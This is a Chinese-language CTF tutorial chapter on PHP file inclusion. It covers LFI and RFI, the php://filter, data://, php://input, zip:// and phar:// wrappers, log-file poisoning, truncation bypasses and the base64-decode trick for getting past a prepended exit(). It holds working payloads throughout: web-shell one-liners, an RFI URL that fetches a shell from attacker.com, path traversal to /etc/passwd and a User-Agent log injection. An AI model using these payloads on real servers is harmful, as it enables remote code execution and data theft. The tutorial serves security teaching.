# 1. 文件包含

文件包含漏洞让服务器把任意文件当成代码执行。配合PHP伪协议，即使只能读文件也能变成代码执行。

## 1.1 文件包含常见函数

文件包含漏洞的核心在于 PHP 中一些函数在引入文件时，文件名由用户控制且未经严格校验。以下是 PHP 中最常见的文件包含相关函数：

**核心包含函数：**

| 函数 | 说明 | 出错时行为 |
|------|------|------------|
| `include()` | 包含并运行指定文件 | 警告（Warning），脚本继续执行 |
| `include_once()` | 同上，但只包含一次，避免重复定义 | 同上 |
| `require()` | 包含并运行指定文件 | 致命错误（Fatal Error），脚本停止 |
| `require_once()` | 同上，但只包含一次 | 同上 |

**简单理解：**

`include()` 和 `require()` 的作用就是把另一个文件的内容"粘贴"到当前位置来执行。比如：

```php
// index.php
$file = $_GET['page'];
include($file);
```

如果访问 `index.php?page=test.php`，PHP 就会去读取 `test.php` 并执行其中的代码。如果 `$file` 的值来自用户输入且没有过滤，攻击者就能控制包含哪个文件，这就是文件包含漏洞。

**其他可能触发文件包含/读取的函数：**

- `fopen()` — 打开文件
- `file_get_contents()` — 读取文件内容到字符串
- `highlight_file()` / `show_source()` — 高亮显示文件源码
- `readfile()` — 读取文件并写入输出缓冲
- `file()` — 把整个文件读入数组

> **与 RCE 中危险函数的区别**：RCE 中提到的 `system()`、`eval()` 等是直接执行命令或代码。文件包含函数本身不执行命令，但可以通过包含恶意文件间接达到代码执行的效果。

## 1.2 本地文件包含（LFI）

本地文件包含（Local File Inclusion，LFI）是指包含的文件位于服务器本地。这是 CTF 中最常见的文件包含类型。

**漏洞代码示例：**

```php
<?php
$file = $_GET['file'];      // 用户可控
include($file);    // 直接包含用户输入
?>
```

**常见利用方式：**

**1. 读取系统敏感文件**

通过目录穿越（`../`）读取系统文件：

```
?file=../../../../etc/passwd
?file=../../../../proc/self/environ
```

**Linux 下常见敏感文件：**

| 路径 | 说明 |
|------|------|
| `/etc/passwd` | 系统用户信息 |
| `/etc/hosts` | 主机名与 IP 映射 |
| `/proc/self/environ` | 当前进程环境变量 |
| `/proc/self/fd/1` | 标准输出文件描述符 |
| `/proc/self/fd/2` | 标准错误文件描述符 |
| `/var/log/apache2/access.log` | Apache 访问日志 |
| `/var/log/nginx/access.log` | Nginx 访问日志 |
| `/var/log/auth.log` | 认证日志 |
| `/var/log/vsftpd.log` | FTP 日志 |

**Windows 下常见敏感文件：**

| 路径 | 说明 |
|------|------|
| `C:\Windows\System32\drivers\etc\hosts` | 主机文件 |
| `C:\boot.ini` | 系统启动配置 |
| `C:\Windows\win.ini` | Windows 配置 |
| `C:\Windows\System32\inetsrv\config\applicationHost.config` | IIS 配置 |

**2. 包含 Web 应用自身文件**

读取网站源码：
```
?file=index.php          → 不会正常显示，因为 PHP 代码被执行了
?file=../config.php      → 可能读取到数据库密码等敏感配置
```

直接包含 `.php` 文件会因为代码被执行而看不到源码。此时需要用到伪协议（见 7.4 节）。

**3. 包含日志文件（Getshell 常用手段）**

当无法上传文件时，可以尝试包含服务器的日志文件。先通过 HTTP 请求向日志中写入 PHP 代码，再包含该日志文件执行（详见 7.5 节）。

**4. 包含上传的文件**

如果有文件上传点，可以将一句话木马藏在图片或其他文件中，再通过文件包含漏洞来执行（详见 8. 文件上传）。

## 1.3 远程文件包含（RFI）

远程文件包含（Remote File Inclusion，RFI）是指包含远程服务器上的文件。与 LFI 不同，RFI 要求服务器开启相关配置。

**利用条件：**

`php.ini` 中需要开启：
- `allow_url_include = On`（PHP 5.2+ 默认关闭）
- `allow_url_fopen = On`（通常默认开启）

**攻击原理：**

攻击者在自己控制的 VPS 上放置恶意 PHP 文件，然后让目标服务器去包含它：

```
# 攻击者 VPS 上的 shell.txt
<?php system($_GET['cmd']); ?>

# 目标 URL
http://target.com/index.php?file=http://attacker.com/shell.txt&cmd=whoami
```

目标服务器会从攻击者 VPS 下载 `shell.txt` 并在本地执行，`system('whoami')` 也就运行在目标服务器上了。

> **为什么 `.txt` 文件也能触发？为什么是 PHP 解释器在执行？**
>
> 这是初学者最容易困惑的地方。要理解这个问题，先要搞清楚 `include()` 到底是什么。
>
> **`include()` 不是简单的"读取文件内容"。** 它的工作方式是：把目标文件的内容**当作 PHP 代码插入到当前脚本中**，然后交给正在运行的 PHP 解释器去解析执行。
>
> 打个比方：`index.php` 本身就正在被 PHP 解释器执行。当解释器执行到 `include('shell.txt')` 这一行时，它会暂停当前脚本，去取 `shell.txt` 的内容，把内容**当作 PHP 代码的一部分**继续解释执行，执行完再回到原来的位置继续。
>
> 同样的道理，如果你上传一个改后缀为 `.jpg` 的 PHP 木马（"图片马"），通过 `include()` 来加载它，一样会触发代码执行。

**LFI 与 RFI 对比：**

| 对比项 | LFI（本地文件包含） | RFI（远程文件包含） |
|--------|---------------------|---------------------|
| 文件位置 | 服务器本地 | 远程服务器 |
| 利用条件 | 只需漏洞存在 | 需 `allow_url_include=On` |
| 利用难度 | 较低 | 需额外配置 |
| 危害程度 | 信息泄露 → 可配合升级为 RCE | 直接代码执行 |
| CTF 出现频率 | 高 | 中（现代 PHP 默认关闭） |

## 1.4 PHP 伪协议利用

PHP 伪协议是文件包含漏洞中最重要的利用技巧之一。即使 `allow_url_include` 关闭，很多伪协议仍然可以使用。

### 1.4.1 php://filter（读取文件源码）

`php://filter` 是一种元封装器（meta-wrapper），用于对数据流进行过滤处理。当直接包含 `.php` 文件时源码会被执行而看不到，使用 `php://filter` 配合 base64 编码就能读取源码。

**常用方式：**

```
?file=php://filter/read=convert.base64-encode/resource=index.php
```

执行流程：
1. `resource=index.php` — 指定要读取的文件
2. `convert.base64-encode` — 对文件内容进行 base64 编码
3. 浏览器输出 base64 编码后的源码，解码即可看到原始 PHP 代码

**为什么需要 base64 编码？**

如果不编码，`index.php` 中的 `<?php ... ?>` 代码会被 PHP 解释器执行，你看到的只是执行结果（通常是空白页）。编码后的内容不会被当作 PHP 代码执行，而是原样输出。

**常用过滤器：**

| 过滤器 | 说明 |
|--------|------|
| `convert.base64-encode` | Base64 编码，最常用 |
| `convert.base64-decode` | Base64 解码 |
| `string.rot13` | ROT13 编码 |
| `convert.iconv.*` | 字符编码转换 |
| `string.toupper` | 转大写 |
| `string.tolower` | 转小写 |

**链式调用：**

多个过滤器可以用 `|` 连接，按顺序从左到右执行：

```
?file=php://filter/read=string.rot13|convert.base64-encode/resource=index.php
```

执行顺序：先对文件内容做 ROT13 编码，再对结果做 base64 编码，最后输出。

---

### 1.4.2 data://（直接执行代码）

`data://` 伪协议允许直接传递数据，配合 `include()` 可以直接执行 PHP 代码。

**基本用法：**

```
# 纯文本方式
?file=data://text/plain,<?php phpinfo();?>

# base64 编码方式（绕过过滤）
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

> `PD9waHAgcGhwaW5mbygpOz8+` 是 `<?php phpinfo();?>` 的 base64 编码。

**适用场景：**

- 需要直接执行 PHP 代码时
- 没有自己的 VPS 来托管远程文件时——相比 RFI（`http://`）的优势是代码可以直接写在 URL 里，不需要额外搭建服务器
- 不依赖文件上传或日志文件，可以直接在 URL 中写入 payload

**使用条件：**

- `allow_url_include = On`
- `allow_url_fopen = On`

---

### 1.4.3 file://（直接读本地文件）

`file://` 协议是最简单的读本地文件协议，**不受 `allow_url_fopen` 和 `allow_url_include` 影响**。

**基本用法：**

```
?file=file:///etc/passwd
?file=file:///var/www/html/config.php
```

使用绝对路径，前面有三个斜杠（`file://` 后跟完整路径 `/etc/passwd`，合起来就是 `file:///etc/passwd`）。

---

### 1.4.4 php://input（POST 传代码）

`php://input` 可以访问 HTTP 请求的原始数据（raw request body），不受 `allow_url_fopen` 限制；但把它交给 `include()` / `require()` 当 PHP 代码执行时，**受 `allow_url_include` 限制**。它本身只提供原始字节流，不会自动执行请求体。

**基本用法：**

URL：`?file=php://input`

POST body：
```php
<?php system('ls'); ?>
```

**适用场景：**

- 需要传递较长的 PHP 代码
- `data://` 被禁用时
- 需要执行多行代码或复杂逻辑

**注意事项：**

- **默认配置下处理 `multipart/form-data` 时，`php://input` 通常不可用。**

  原因和 PHP 底层处理 POST body 的机制有关：

  - **普通表单 / JSON（`application/x-www-form-urlencoded` / `application/json`）**：通常可以读取原始请求体；PHP 5.6 起 `php://input` 可以重复读取，老版本行为不同。
  - **文件上传（`multipart/form-data`）**：当 `enable_post_data_reading` 保持默认开启时，PHP 会先解析 multipart 数据并填充 `$_POST` / `$_FILES`，此时 `php://input` 不可用；关闭该配置时行为不同，但应用也要自行解析请求体。

  所以用 `php://input` 传代码时，通常应避免 `multipart/form-data`，并同时确认 PHP 版本、`enable_post_data_reading` 与 `allow_url_include`。

- 请求方法通常是 POST
- 页面没有回显时，可与外带数据技巧结合
- **PHP 协议名不区分大小写。** 如果题目过滤了 `php` 关键词（如 `strpos($file, 'php') !== false`），直接写 `Php://input` 或 `PHP://input` 即可绕过。这个特性对所有 PHP 伪协议都适用——`pHp://filter`、`FILE://`、`DatA://` 均有效。

---

### 1.4.5 其他伪协议

| 协议 | 说明 | 示例 |
|------|------|------|
| `expect://` | 直接执行命令（需安装 expect 扩展） | `expect://whoami` |
| `zip://` | 包含 ZIP 压缩包内的文件 | `zip:///var/www/html/uploads/shell.zip%23shell.txt` |
| `phar://` | 包含 phar 包内文件；PHP 7 及之前还可能隐式触发 metadata 反序列化 | `phar://uploads/shell.jpg/shell.php` |
| `compress.zlib://` | 包含 gz 压缩文件 | `compress.zlib:///var/www/html/uploads/shell.jpg` |
| `compress.bzip2://` | 包含 bz2 压缩文件 | `compress.bzip2:///var/www/html/uploads/shell.jpg` |

> **关于 `zip://` 和 `phar://`：**
>
> 这两个协议在 CTF 中很实用。如果能上传一个 `.zip` 或 `.phar` 文件，即使后缀被改成 `.jpg`，通过这两个协议仍然能包含其中打包的 PHP 代码。
>
> **`zip://` 中 `%23` 是什么？** `#` 在 URL 里是锚点标识符，直接写会被浏览器截断。`%23` 是 `#` 的 URL 编码，PHP 解析时会把它还原为 `#`，而 `zip://` 用 `#` 分隔压缩包路径和包内文件名。所以：
> ```
> zip://uploads/shell.zip#shell.txt      → 在代码或本地路径中直接写
> ?file=zip://uploads/shell.zip%23shell.txt  → 在 URL 里必须编码为 %23
> ```
>
> **`phar://` 读取归档时通常不依赖上传后的扩展名。** 即使 phar 被改名为 `shell.jpg`，仍可能通过 `phar://uploads/shell.jpg/shell.php` 读取包内文件。元数据反序列化必须区分版本：PHP 7 及之前打开归档会自动反序列化 metadata；PHP 8 起普通文件操作不再自动反序列化，只有显式调用 `Phar::getMetadata()` 等接口才会触发。这一点在“PHP 反序列化”章节会深入讨论。

---

### 1.4.6 伪协议可用性总结

| 协议 | 依赖 `allow_url_include` | 依赖 `allow_url_fopen` | CTF 出现频率 |
|------|:---:|:---:|:---:|
| `php://filter` | 否 | 否 | 极高 |
| `php://input` | **作为 include 目标时是** | 否 | 高 |
| `file://` | 否 | 否 | 高 |
| `data://` | 是 | 是 | 中 |
| `zip://` | 否 | 否 | 中 |
| `phar://` | 否 | 否 | 中 |
| `expect://` | 否 | 否 | 低（需扩展） |

## 1.5 包含日志文件 Getshell

当服务器存在文件包含漏洞但没有文件上传点时，可以利用服务器日志文件来 Getshell。

**核心思路：**

1. 通过 HTTP 请求（如 User-Agent）向服务器日志中"写入" PHP 一句话木马
2. 通过文件包含漏洞包含该日志文件
3. 日志中的 PHP 代码被执行，Getshell

**Apache 日志包含：**

Apache 默认日志路径：
- `/var/log/apache2/access.log`（Debian/Ubuntu）
- `/var/log/httpd/access_log`（CentOS/RHEL）
- `/opt/lampp/logs/access_log`（XAMPP）

**攻击步骤：**

Step 1 — 向日志中写入 PHP 代码。修改请求的 User-Agent 为木马：

```
GET / HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>
```

这条请求会被记录在 access.log 中，User-Agent 的内容（即 PHP 代码）原样写入日志。

Step 2 — 包含日志文件执行代码：

```
?file=/var/log/apache2/access.log&cmd=whoami
```

服务器包含 `access.log` → 日志中的 `<?php system($_GET['cmd']); ?>` 被 PHP 解析执行 → `system('whoami')` 执行 → 输出命令结果。

**Nginx 日志包含：**

Nginx 默认日志路径：
- `/var/log/nginx/access.log`
- `/var/log/nginx/error.log`

攻击方式与 Apache 相同。

**SSH 日志包含：**

SSH 日志路径：`/var/log/auth.log`（或 `/var/log/secure`）

也可以尝试通过 SSH 连接的用户名向 auth.log 写入 PHP 代码：

```bash
ssh '<?php system("id");?>'@目标IP
```

连接失败后，用户名（即 PHP 代码）会被记录到 auth.log 中，再通过文件包含来执行。

> **注意：这是一个 CTF 专用技巧，真实环境中几乎不可行。** 原因有二：第一，`auth.log` 默认权限为 `640`（属主 `root`），Web 服务器用户（如 `www-data`）没有读权限；第二，SSH 用户名不允许 `<`、`?` 等特殊字符，这些字符在写入日志前就会被 SSH 服务拒绝。CTF 题目中通常故意放宽了这些限制。

**日志路径探测技巧：**

当不确定日志路径时：
1. 根据错误回显判断服务器类型（Apache/Nginx/IIS）
2. 尝试常见默认路径
3. 如果已有 LFI，直接包含服务器配置文件查看日志路径：
   - Apache：`/etc/apache2/apache2.conf` 或 `/etc/httpd/conf/httpd.conf`，搜索 `CustomLog`、`ErrorLog` 字段
   - Nginx：`/etc/nginx/nginx.conf`，搜索 `access_log`、`error_log` 字段
4. 结合 phpinfo 页面查看 `APACHE_LOG_DIR` 等环境信息

## 1.6 文件包含截断绕过

某些题目会在包含参数后拼接固定后缀（如 `.php`、`.html`），需要通过截断来绕过。

**典型代码：**

```php
<?php
$file = $_GET['file'];
include($file . '.php');   // 强制拼接 .php 后缀
?>
```

你传 `?file=index`，实际包含的是 `index.php`，无法直接包含 `/etc/passwd`。

### 1.6.1 %00 截断（PHP < 5.3.4）

在 PHP 5.3.4 之前，可以通过 `%00`（空字节）截断字符串：

```
?file=../../../etc/passwd%00
```

PHP 在底层调用 C 的 `fopen()` 时，`%00` 被解释为字符串结束符 `\0`，后面的 `.php` 被截断，实际包含的是 `/etc/passwd`。

> `magic_quotes_gpc = On` 时 `%00` 会被转义，此方法失效。PHP 5.3.4+ 已修复。

### 1.6.2 路径长度截断（PHP < 5.2.8）

在 PHP 5.2.8 之前，操作系统对路径长度有限制。传入超过限制长度的路径时，末尾的字符（包括拼接的 `.php`）会被丢弃：

```
?file=../../../etc/passwd/./././././. ...（持续叠加直到超过 4096 字节）
```

> **PHP（7.x、8.x）下以上截断方法均已失效。但仍有绕过思路：**

### 1.6.3 现代 PHP 下的绕过策略

**利用 `data://` 执行代码**

当你不需要读文件、而是想执行 PHP 代码时，`data://` 天然免疫后缀拼接：

```
?file=data://text/plain,<?php system('ls');?>
```

拼上 `.php` 之后变成：

```
data://text/plain,<?php system('ls');?>.php
```

`?>` 已经闭合了 PHP 代码块，末尾的 `.php` 只是普通文本，PHP 解释器直接忽略（原样输出）。代码照常执行。

**前提是 `allow_url_include = On`。**

## 1.7 `php://filter` 在文件写入中的利用 —— 绕过 `<?php exit();?>`

前面讲的都是 `include()` 读文件的场景。实际上 `php://filter` 在**文件写入**场景中也能派上用场。一个典型的 CTF 题目模式是：

```php
file_put_contents($filename, "<?php exit();?>" . $content);
```

你可以控制 `$filename` 和 `$content`，但写入的内容前面被强制拼接了 `<?php exit();?>`。`exit()` 会让 PHP 脚本在到达你的代码之前就终止，所以直接写入一句话木马后去访问，页面什么也不会输出。

### 1.7.1 核心思路：`convert.base64-decode` 吞掉前置字符

**关键特性：** PHP 的 `convert.base64-decode` 过滤器在解码时，遇到不是合法 base64 的字符（A-Z、a-z、0-9、`+`、`/`、`=` 以外的所有字符），会**静默跳过**，不报错也不中止。

于是你让 `filename` 指向一个带了 `base64-decode` 过滤器的流，`file_put_contents()` 写入数据时，数据先经过 `base64-decode` 解码再写入文件：

```
POST:
  filename=php://filter/write=convert.base64-decode/resource=shell.php
  content=aPD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

**逐步拆解：**

**Step 1 —** `file_put_contents()` 接收到的原始内容：

```
<?php exit();?>aPD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

前面是 `<?php exit();?>`（题目拼接的），后面是你的 base64 payload。

**Step 2 —** 数据流经 `convert.base64-decode` 过滤器。`<?php exit();?>` 中只有 `p h p e x i t` 这 7 个字母是合法 base64 字符，其余 `< ? 空格 ( ) ; >` 全部被静默丢弃。过滤后实际参与解码的字符串是：

```
phpexitaPD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

前面 `phpexita` 是残留下来的"碎片"（8 个字符正好是你加的那个占位 `a` + 前一步的 7 个），解码后得到 6 字节不可读乱码。后面是你完整的 base64 payload，正常解码为 `<?php system('cat /flag');?>`。

**Step 3 —** 最终写入 `shell.php` 的内容：

```
[6字节乱码]<?php system('cat /flag');?>
```

乱码部分不在 `<?php ... ?>` 标签内，PHP 会把它当作普通响应字节输出；随后解析到你的 `<?php system('cat /flag');?>` 时仍会执行代码。是否产生额外警告取决于后续文件内容和运行配置，并不是这个前缀的固定行为。

### 1.7.2 Payload 构造要点——为什么要用 `a` 占位对齐

你的 base64 payload 前面多了一个 `a`，这不是随便加的。

**Base64 解码以 4 个字符为一组进行。** 4 个 base64 字符 → 3 个原始字节。如果你传给解码器的字符串总长度不是 4 的倍数，最后一组会被丢弃或用 `=` 补齐，导致数据错乱。

回到本例：

```
<?php exit();?> 中幸存的合法字符: p h p e x i t → 共 7 个
```

7 不是 4 的倍数。如果你直接在后面拼 base64 payload：

```
p h p e x i t  P D 9  w  a  H  A  ... （payload 开头）
└───┬───┘└───┬───┘└───┬───┘└───┬───┘
  组1       组2       组3       组4  ← 组3 只有 3 个有效字符（tPD），被当成不完整组
```

你的 payload 开头 `PD9w` 被拆散到两个不同的组里，解码结果完全错乱。

**加一个 `a` 凑成 8 个**（2 个完整组 × 4），你的 payload 就能从第 3 组开头干净地开始：

```
p h p e x i t a  P D 9  w  a  H  A  ... （payload 开头）
└───┬───┘└───┬───┘└───┬───┘└───┬───┘
  组1       组2       组3       组4  ← 每组都是完整的 4 个字符
```

`phpe` 解码为 3 字节乱码，`xita` 解码为 3 字节乱码，然后 `PD9w` 开始整整齐齐地解码为你的 PHP 代码。**
